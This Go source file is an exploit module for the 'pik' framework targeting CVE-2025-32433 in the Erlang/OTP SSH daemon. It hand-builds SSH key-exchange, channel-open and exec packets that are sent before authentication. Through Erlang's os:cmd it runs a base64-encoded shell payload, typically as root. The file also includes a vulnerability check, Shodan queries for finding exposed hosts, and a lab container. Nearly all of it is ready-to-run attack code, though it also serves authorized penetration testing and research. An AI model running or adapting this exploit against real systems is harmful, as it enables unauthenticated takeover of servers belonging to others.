package main

import (
	"github.com/Chocapikk/pik/sdk"
	_ "github.com/Chocapikk/pik/pkg/cli"
	_ "github.com/Chocapikk/pik/pkg/lab"
	_ "github.com/Chocapikk/pik/pkg/protocol/tcp"
)

type ErlangSSHRCE struct{ sdk.Pik }

func (m *ErlangSSHRCE) Info() sdk.Info {
	return sdk.Info{
		Name:        "Erlang/OTP SSH",
		Versions:    "< OTP-27.3.3, < OTP-26.2.5.11, < OTP-25.3.2.20",
		Description: "Unauthenticated RCE via SSH Channel State Machine Flaw",
		Detail: sdk.Dedent(`
			The Erlang/OTP SSH daemon does not validate that a client has
			completed authentication before accepting connection-layer
			messages. By sending channel open and exec requests immediately
			after key exchange, an unauthenticated attacker can invoke
			Erlang's os:cmd/1 and execute arbitrary system commands,
			typically as root.
		`),
		Authors: []sdk.Author{
			{Name: "Matt Keeley", Company: "Horizon3 Attack Team"},
			{Name: "Valentin Lobstein", Handle: "Chocapikk", Email: "<chocapikk[at]leakix.net>"},
		},
		DisclosureDate: "2025-04-16",
		Reliability:    sdk.Certain,
		Stance:         sdk.Aggressive,
		Privileged:     true,
		Notes: sdk.Notes{
			Stability:   []string{sdk.CrashSafe},
			SideEffects: []string{sdk.IOCInLogs},
			Reliability: []string{sdk.RepeatableSession},
		},
		References: []sdk.Reference{
			sdk.CVE("2025-32433"),
			sdk.GHSA("37cp-fgq5-7wc2", "erlang/otp"),
		},
		Queries: []sdk.Query{
			sdk.Shodan(`product:"Erlang" port:22`),
			sdk.Shodan(`"Erlang" ssh`),
		},
		DefaultOptions: map[string]string{
			"RPORT": "2222",
		},
		Lab: sdk.Lab{
			Services: []sdk.Service{
				sdk.NewLabService("sshd", "vulhub/erlang:27.3.2-with-ssh", "2222:2222"),
			},
		},
		Targets: []sdk.Target{
			{
				Name:     "Unix/Linux Command Shell",
				Platform: "linux",
				Type:     "cmd",
			},
		},
	}
}

func (m *ErlangSSHRCE) Check(run *sdk.Context) (sdk.CheckResult, error) {
	conn, banner, err := m.preauth(run)
	if err != nil {
		return sdk.Unknown(err)
	}
	defer conn.Close()

	if !sdk.ContainsI(banner, "erlang") {
		return sdk.Safe("not an Erlang SSH service")
	}

	marker := "pik_" + run.RandText(8)
	if err := sendSSH(conn, sshChannelExec(0, erlangCmd("echo "+marker))); err != nil {
		return sdk.Unknown(err)
	}

	if resp, _ := conn.Recv(1024); len(resp) > 0 {
		return sdk.Vulnerable("server processed pre-auth SSH exec request")
	}
	return sdk.Safe("target rejected pre-auth channel request")
}

func (m *ErlangSSHRCE) Exploit(run *sdk.Context) error {
	conn, _, err := m.preauth(run)
	if err != nil {
		return err
	}
	defer conn.Close()

	run.Status("Sending pre-auth exec")
	bgPayload := run.Base64Bash(run.Payload()) + " &"
	if err := sendSSH(conn, sshChannelExec(0, erlangCmd(bgPayload))); err != nil {
		return err
	}

	conn.Recv(1024)
	return nil
}

func (m *ErlangSSHRCE) preauth(run *sdk.Context) (sdk.Conn, string, error) {
	conn, err := run.Dial()
	if err != nil {
		return nil, "", err
	}

	banner, err := sshBanner(conn)
	if err != nil {
		conn.Close()
		return nil, "", err
	}

	for _, pkt := range [][]byte{sshKEXINIT(), sshChannelOpen(0)} {
		if err := sendSSH(conn, pkt); err != nil {
			conn.Close()
			return nil, "", err
		}
	}

	return conn, banner, nil
}

// --- SSH helpers ---

func erlangCmd(shellCmd string) string {
	return sdk.Sprintf(`os:cmd(binary_to_list(base64:decode("%s"))).`, sdk.Base64Encode(shellCmd))
}

func sshBanner(conn sdk.Conn) (string, error) {
	resp, err := conn.SendRecv([]byte("SSH-2.0-OpenSSH_8.9\r\n"), 1024)
	if err != nil {
		return "", err
	}
	return string(resp), nil
}

func sendSSH(conn sdk.Conn, payload []byte) error {
	return conn.Send(sshPad(payload))
}

func sshPad(payload []byte) []byte {
	const blockSize = 8
	paddingLen := blockSize - ((len(payload) + 5) % blockSize)
	if paddingLen < 4 {
		paddingLen += blockSize
	}
	totalLen := len(payload) + 1 + paddingLen
	return sdk.NewBuffer().
		Uint32(totalLen).
		Byte(paddingLen).
		Bytes(payload).
		Zeroes(paddingLen).
		Build()
}

func sshKEXINIT() []byte {
	return sdk.NewBuffer().
		Byte(0x14).Zeroes(16).
		NameList("curve25519-sha256", "ecdh-sha2-nistp256", "diffie-hellman-group-exchange-sha256", "diffie-hellman-group14-sha256").
		NameList("rsa-sha2-256", "rsa-sha2-512").
		NameList("aes128-ctr").NameList("aes128-ctr").
		NameList("hmac-sha1").NameList("hmac-sha1").
		NameList("none").NameList("none").
		String("").String("").
		Byte(0x00).Uint32(0).
		Build()
}

func sshChannelOpen(id int) []byte {
	return sdk.NewBuffer().
		Byte(0x5a).String("session").Uint32(id).Uint32(0x68000).Uint32(0x10000).
		Build()
}

func sshChannelExec(id int, command string) []byte {
	return sdk.NewBuffer().
		Byte(0x62).Uint32(id).String("exec").Byte(0x01).String(command).
		Build()
}

func main() {
	sdk.Run(&ErlangSSHRCE{}, sdk.WithLab())
}
